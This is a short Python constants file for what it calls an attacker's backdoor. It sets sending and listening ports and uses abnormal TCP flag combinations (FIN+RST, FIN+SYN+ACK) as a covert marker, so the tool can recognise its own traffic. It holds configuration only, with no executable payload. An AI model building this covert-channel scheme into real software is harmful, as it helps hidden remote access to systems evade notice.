"""
holds the consts for the attacker
"""
############# THE BACKDOOR SETTINGS #############
SENDING_PORT = 64321
LISTENING_PORT = 42069
SENDING_FLAG_VALUE = 5 #This Gives The Value of FIN RST flags, and if you know the protocol TCP, they never apear together. (pretty good way to see its our tool that contacts us)
RECIEVING_FLAG_VALUE = 19 # This Gives The Value of FIN SYN and ACK flags, and if you know the protocol TCP, they never apear together. (pretty good way to see its our program that contacts us)
